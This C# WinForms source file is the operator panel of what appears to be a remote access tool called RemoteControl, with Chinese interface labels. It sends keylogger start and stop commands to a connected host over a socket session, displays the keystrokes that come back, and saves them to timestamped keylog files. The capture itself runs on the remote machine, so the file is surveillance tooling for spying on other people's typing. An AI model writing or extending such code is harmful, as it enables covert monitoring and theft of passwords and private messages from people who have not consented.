using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Server
{
    public class FrmKeylogger : FrmBase
    {
        private SocketSession _session;
        private TextBox _logTextBox;
        private TextBox _pathBox;
        private bool _isRunning = false;
        private StringBuilder _allLogs = new StringBuilder();

        public FrmKeylogger(SocketSession session, string hostName, int sessionId)
        {
            _session = session;
            this.Text = "键盘记录 — " + hostName + " (" + sessionId + ")";
            this.Size = new Size(550, 420);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 32;
            topPanel.Padding = new Padding(8, 4, 8, 4);

            var sessionLabel = new Label();
            sessionLabel.Text = "会话: ";
            sessionLabel.AutoSize = true;
            sessionLabel.Location = new Point(8, 7);

            var pathLabel = new Label();
            pathLabel.Text = "路径:";
            pathLabel.AutoSize = true;
            pathLabel.Location = new Point(60, 7);

            _pathBox = new TextBox();
            _pathBox.Location = new Point(100, 4);
            _pathBox.Size = new Size(200, 22);

            var getPathBtn = new Button();
            getPathBtn.Text = "获取路径";
            getPathBtn.Location = new Point(310, 3);
            getPathBtn.Size = new Size(75, 26);
            getPathBtn.Click += (s, e) => { };

            topPanel.Controls.AddRange(new Control[] { sessionLabel, pathLabel, _pathBox, getPathBtn });

            var buttonPanel = new Panel();
            buttonPanel.Dock = DockStyle.Top;
            buttonPanel.Height = 36;
            buttonPanel.Padding = new Padding(8, 4, 8, 4);

            var startBtn = new Button();
            startBtn.Text = "开始记录";
            startBtn.Location = new Point(8, 4);
            startBtn.Size = new Size(80, 26);
            startBtn.Click += (s, e) => StartKeylogger();

            var stopBtn = new Button();
            stopBtn.Text = "停止记录";
            stopBtn.Location = new Point(100, 4);
            stopBtn.Size = new Size(80, 26);
            stopBtn.Click += (s, e) => StopKeylogger();

            buttonPanel.Controls.AddRange(new Control[] { startBtn, stopBtn });

            _logTextBox = new TextBox();
            _logTextBox.Dock = DockStyle.Fill;
            _logTextBox.Multiline = true;
            _logTextBox.ScrollBars = ScrollBars.Both;
            _logTextBox.Font = new Font("Consolas", 9F);
            _logTextBox.ReadOnly = true;
            _logTextBox.BackColor = Color.White;

            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 36;
            bottomPanel.Padding = new Padding(8, 4, 8, 4);

            var clearBtn = new Button();
            clearBtn.Text = "清空";
            clearBtn.Location = new Point(8, 4);
            clearBtn.Size = new Size(75, 26);
            clearBtn.Click += (s, e) => { _logTextBox.Clear(); _allLogs.Clear(); };

            var saveBtn = new Button();
            saveBtn.Text = "保存";
            saveBtn.Location = new Point(100, 4);
            saveBtn.Size = new Size(75, 26);
            saveBtn.Click += (s, e) => SaveLog();

            bottomPanel.Controls.AddRange(new Control[] { clearBtn, saveBtn });

            this.Controls.Add(_logTextBox);
            this.Controls.Add(bottomPanel);
            this.Controls.Add(buttonPanel);
            this.Controls.Add(topPanel);
        }

        private void StartKeylogger()
        {
            if (_isRunning) return;
            _isRunning = true;
            _session.Send(ePacketType.PACKET_KEYLOGGER_START_REQUEST,
                new RequestKeylogger { Action = eKeyloggerAction.Start });
        }

        private void StopKeylogger()
        {
            _isRunning = false;
            _session.Send(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST,
                new RequestKeylogger { Action = eKeyloggerAction.Stop });
        }

        public void HandleKeylogData(ResponseKeylogger resp)
        {
            if (resp == null || string.IsNullOrEmpty(resp.LogData)) return;
            this.BeginInvoke((Action)(() =>
            {
                _allLogs.Append(resp.LogData);
                _logTextBox.AppendText(resp.LogData);
            }));
        }

        private void SaveLog()
        {
            using (var dlg = new SaveFileDialog())
            {
                dlg.Filter = "文本文件|*.txt";
                dlg.FileName = "keylog_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".txt";
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(dlg.FileName, _allLogs.ToString());
                }
            }
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            if (_isRunning) StopKeylogger();
            base.OnFormClosed(e);
        }
    }
}
